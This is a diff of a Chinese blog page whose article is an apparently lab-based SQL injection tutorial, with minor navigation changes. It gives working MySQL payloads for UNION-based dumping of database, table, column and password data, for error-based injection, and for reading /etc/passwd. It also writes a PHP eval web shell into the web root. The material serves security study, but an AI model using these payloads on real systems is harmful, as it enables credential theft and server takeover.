@@ -360,7 +360,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    834
+                    835
                 </div>
                 
 
@@ -380,31 +380,41 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="获取数据库数据"><a href="#获取数据库数据" class="headerlink" title="获取数据库数据"></a>获取数据库数据</h1><h2 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1. 寻找注入点"></a>1. 寻找注入点</h2><p>利用引号、括号等构造闭合，判断是否存在注入点。也可能没有保护，不需要构造闭合。</p>
+                <h1>获取数据库数据</h1>
+<h2 id="1-寻找注入点">1. 寻找注入点</h2>
+<p>利用引号、括号等构造闭合，判断是否存在注入点。也可能没有保护，不需要构造闭合。</p>
 <ul>
 <li>可以用#和–+来构造注释</li>
 </ul>
-<h2 id="2-判断是否存在注入"><a href="#2-判断是否存在注入" class="headerlink" title="2. 判断是否存在注入"></a>2. 判断是否存在注入</h2><p>在闭合后的语句中插入1=1，查看该位置语句是否被运算</p>
-<h2 id="3-判断当前表有多少列"><a href="#3-判断当前表有多少列" class="headerlink" title="3. 判断当前表有多少列"></a>3. 判断当前表有多少列</h2><p>利用order by ($数字) 来判断总共有多少列</p>
+<h2 id="2-判断是否存在注入">2. 判断是否存在注入</h2>
+<p>在闭合后的语句中插入1=1，查看该位置语句是否被运算</p>
+<h2 id="3-判断当前表有多少列">3. 判断当前表有多少列</h2>
+<p>利用order by ($数字) 来判断总共有多少列</p>
 <p>闭合后语句如下</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4. 判断显示位"></a>4. 判断显示位</h2><p>借助union连接查询语句<br>将前半部分的查询(实际上为空)和后半部分语句拼接。<br>因为前半部分为空，所以实际会显示后半部分中的内容。因此可以看到实际上选择了id表中的哪几列。</p>
+<h2 id="4-判断显示位">4. 判断显示位</h2>
+<p>借助union连接查询语句<br>
+将前半部分的查询(实际上为空)和后半部分语句拼接。<br>
+因为前半部分为空，所以实际会显示后半部分中的内容。因此可以看到实际上选择了id表中的哪几列。</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>2，3</p>
 </blockquote>
-<h2 id="4-1-报错注入"><a href="#4-1-报错注入" class="headerlink" title="4.1 报错注入"></a>4.1 报错注入</h2><p>当注入点位于登录框时，可能没有显示位但是能显示错误信息，此时可以使用报错注入。<br>mysql从5.1.5版本开始提供xml查询和修改函数。extractvalue和updatexml。</p>
+<h2 id="4-1-报错注入">4.1 报错注入</h2>
+<p>当注入点位于登录框时，可能没有显示位但是能显示错误信息，此时可以使用报错注入。<br>
+mysql从5.1.5版本开始提供xml查询和修改函数。extractvalue和updatexml。</p>
 <pre class="line-numbers language-none"><code class="language-none">UPDATEXML (XML_document, XPath_string, new_value);
 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。
 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
 第三个参数：new_value，String格式，替换查找到的符合条件的数据 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>第二个参数要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。因此我们可以故意使它报错，将查询信息显示出来。</p>
-<h2 id="5-查询数据库名"><a href="#5-查询数据库名" class="headerlink" title="5. 查询数据库名"></a>5. 查询数据库名</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="5-查询数据库名">5. 查询数据库名</h2>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>@localhost，security</p>
 </blockquote>
-<h2 id="6-查询数据库表名"><a href="#6-查询数据库表名" class="headerlink" title="6. 查询数据库表名"></a>6. 查询数据库表名</h2><p>在mysql5.0以上版本，默认有三个库：mysql、information_schema、performance_schema。infomation_schema中会记录库中的表名</p>
+<h2 id="6-查询数据库表名">6. 查询数据库表名</h2>
+<p>在mysql5.0以上版本，默认有三个库：mysql、information_schema、performance_schema。infomation_schema中会记录库中的表名</p>
 <ul>
 <li>用户被存储在user表中</li>
 <li>SCHEMATA中存储了mysql的所有库名</li>
@@ -423,21 +433,27 @@
 <blockquote>
 <p>emails,referers,uagents,users</p>
 </blockquote>
-<h2 id="7-查询某个表的所有列名"><a href="#7-查询某个表的所有列名" class="headerlink" title="7. 查询某个表的所有列名"></a>7. 查询某个表的所有列名</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"security"</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="7-查询某个表的所有列名">7. 查询某个表的所有列名</h2>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"security"</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>id,username,password</p>
 </blockquote>
-<h2 id="8-查询表中的数据"><a href="#8-查询表中的数据" class="headerlink" title="8. 查询表中的数据"></a>8. 查询表中的数据</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password
+<h2 id="8-查询表中的数据">8. 查询表中的数据</h2>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password
 <span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <blockquote>
 <p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4</p>
 </blockquote>
-<h1 id="获取服务器数据"><a href="#获取服务器数据" class="headerlink" title="获取服务器数据"></a>获取服务器数据</h1><h2 id="1-判断服务器类型"><a href="#1-判断服务器类型" class="headerlink" title="1. 判断服务器类型"></a>1. 判断服务器类型</h2><p>linux服务器区分大小写，windows服务器不区分大小写<br>因此构造</p>
+<h1>获取服务器数据</h1>
+<h2 id="1-判断服务器类型">1. 判断服务器类型</h2>
+<p>linux服务器区分大小写，windows服务器不区分大小写<br>
+因此构造</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> iD<span class="token operator">=</span><span class="token string">'-1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>报错说明是linux</p>
-<h2 id="2-通过load-file函数读取服务器文件"><a href="#2-通过load-file函数读取服务器文件" class="headerlink" title="2. 通过load_file函数读取服务器文件"></a>2. 通过load_file函数读取服务器文件</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h1 id="获取服务器权限"><a href="#获取服务器权限" class="headerlink" title="获取服务器权限"></a>获取服务器权限</h1><p>利用into outfile将程序输出导出到文件</p>
+<h2 id="2-通过load-file函数读取服务器文件">2. 通过load_file函数读取服务器文件</h2>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1>获取服务器权限</h1>
+<p>利用into outfile将程序输出导出到文件</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[1]);?&gt;'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/666.php'</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
                 
             </div>
@@ -687,13 +703,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/08/10/yuan-tou/">
+                <a href="/2021/08/10/set-source/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="佳作赏析">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="常用软件源">
                         
-                        <span class="card-title">佳作赏析</span>
+                        <span class="card-title">常用软件源</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -717,8 +733,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%8E%9F%E5%81%B7/">
-                        <span class="chip tag-color">原偷</span>
+                    <a href="/tags/shell/">
+                        <span class="chip tag-color">shell</span>
                     </a>
                     
                 </div>
@@ -732,13 +748,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/10/shi-xi-di-shi-tian/">
+                <a href="/2021/08/10/yuan-tou/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="实训第十天wp">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="佳作赏析">
                         
-                        <span class="card-title">实训第十天wp</span>
+                        <span class="card-title">佳作赏析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -762,12 +778,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%9E%E8%AE%AD/">
-                        <span class="chip tag-color">四叶草实训</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F/">
-                        <span class="chip tag-color">渗透</span>
+                    <a href="/tags/%E5%8E%9F%E5%81%B7/">
+                        <span class="chip tag-color">原偷</span>
                     </a>
                     
                 </div>
